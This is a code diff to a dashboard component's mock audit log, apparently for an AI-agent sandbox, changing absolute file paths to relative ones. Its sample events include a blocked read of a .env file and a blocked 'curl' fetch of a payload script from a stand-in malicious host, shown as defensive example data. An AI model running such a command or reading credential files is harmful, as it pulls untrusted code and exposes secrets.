@@ -240,10 +240,10 @@ const services = ref([
 ])
 
 const auditEvents = ref([
-  { action: 'BLOCK_READ', target: 'e:/tiaozhanbei/MAC/.env', agent: 'OpenClaw-Worker', time: '23:41:02', blocked: true },
-  { action: 'ALLOW_LIST', target: 'e:/tiaozhanbei/MAC/src/', agent: 'Code-Researcher', time: '23:40:15', blocked: false },
+  { action: 'BLOCK_READ', target: './.env', agent: 'OpenClaw-Worker', time: '23:41:02', blocked: true },
+  { action: 'ALLOW_LIST', target: './src/', agent: 'Code-Researcher', time: '23:40:15', blocked: false },
   { action: 'BLOCK_EXEC', target: 'curl -s https://malicious.io/payload.sh', agent: 'Auto-Runner', time: '23:38:44', blocked: true },
-  { action: 'ALLOW_READ', target: 'e:/tiaozhanbei/MAC/README.md', agent: 'Doc-Writer', time: '23:35:10', blocked: false }
+  { action: 'ALLOW_READ', target: './README.md', agent: 'Doc-Writer', time: '23:35:10', blocked: false }
 ])
 
 function savePrivacySettings() {
